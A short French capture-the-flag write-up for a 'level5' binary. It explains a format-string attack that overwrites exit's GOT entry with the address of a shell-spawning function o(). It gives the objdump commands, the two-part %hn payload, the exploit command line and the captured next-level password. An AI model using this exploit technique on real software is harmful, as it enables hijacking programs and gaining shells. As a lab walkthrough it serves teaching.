# Analyse du code

Il y a deux fonctions en plus du main. La premiere est n() appeler dans le main et la seconde o(), qui n'est appeler nul part.
o() execute un shelll
Grace a printf nous devons copier l'adresse de o() dans la GOT de a la place de exit; comme ca lorsque notre programme va faire un call de exit au lieu d'executer exit, il executera o()

# Preparation du payload

- Trouver l'adresse de O() : objdump -t ./level5 | grep o
    - 080484a4 g     F .text  0000001e              o → \xa4\x84\x04\x08
- Trouver l'adresse de exit() dans GOT : objdump -R ./level5
    - 08049838 R_386_JUMP_SLOT   exit  →  \x38\x98\x04\x08
- Trouver le décalage de notre chaîne sur la pile :
    - AAAA%4$p

Le adresse de o etant un nombre en decimal trop grand nous devons l'ecrire en deux fois, car on risque de corrompre les octes autour. avec %hn nous pouvons ecrire que 2 octets.
	- HIGH : 0x0804 - 8 = 2044
	- LOW :  0x84a4 - 2044 = 31912 ( -8 car ecriture de 2044... = 31904)

python -c "print('\x3a\x98\x04\x08' + '\x38\x98\x04\x08' + '%2044x%4\$hn%31904x%5\$hn')"


# Exploit
	echo $(python -c "print('\x3a\x98\x04\x08' + '\x38\x98\x04\x08' + '%2044x%4\$hn%31904x%5\$hn')") > /tmp/_
	cat /tmp/_ | ./level5
	$ cat /home/user/level6/.pass
	$ d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31